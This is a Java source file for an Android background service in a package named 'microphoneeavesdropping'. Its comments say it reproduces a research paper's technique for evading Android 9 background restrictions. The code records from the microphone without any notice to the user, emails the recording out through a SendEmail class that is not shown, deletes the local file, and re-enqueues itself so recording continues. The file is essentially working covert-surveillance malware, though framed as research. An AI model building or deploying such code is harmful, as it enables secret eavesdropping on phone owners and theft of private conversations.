package com.research.microphoneeavesdropping;

import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import java.io.File;
import java.io.IOException;

/**
 * JobIntentService to run recording in the background
 * Uses the technique described in the paper to circumvent Android 9.0 restrictions
 */
public class Recorder extends JobIntentService {

    private static final String TAG = "RecorderService";
    private static final int JOB_ID = 1000;
    private MediaRecorder recorder;
    private File audioFile;

    /**
     * Method to enqueue the work, as shown in paper's code samples
     */
    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, Recorder.class, JOB_ID, work);
        Log.d(TAG, "Job enqueued to recur every 15 minutes");
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        Log.d(TAG, "Starting recording job");
        startRecording();

        // Paper mentions maximum recording time was 1.5 hours
        try {
            // Recording for a shorter period for demonstration
            Thread.sleep(10 * 60 * 1000); // 10 minutes
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        stopRecording();
        sendEmail();
        deleteFile();

        // Re-enqueue for continuous recording as mentioned in Fig. 6.3
        enqueueWork(getApplicationContext(), new Intent());
    }

    private void startRecording() {
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        // Create file in external storage as mentioned in the paper
        audioFile = new File(Environment.getExternalStorageDirectory().getPath()
                + File.separator + "audio.3gp");

        recorder.setOutputFile(audioFile.getAbsolutePath());

        try {
            recorder.prepare();
            recorder.start();
            Log.d(TAG, "Recording started");
        } catch (IOException e) {
            Log.e(TAG, "Failed to start recording", e);
        }
    }

    private void stopRecording() {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                Log.d(TAG, "Recording stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error stopping recording", e);
            }
        }
    }

    private void sendEmail() {
        // Execute email sending as shown in the paper
        new SendEmail().execute(audioFile);
        Log.d(TAG, "Email sending initiated");
    }

    private void deleteFile() {
        // Delete the file after sending as mentioned in the paper
        if (audioFile != null && audioFile.exists()) {
            boolean deleted = audioFile.delete();
            Log.d(TAG, "Audio file deleted: " + deleted);
        }
    }
}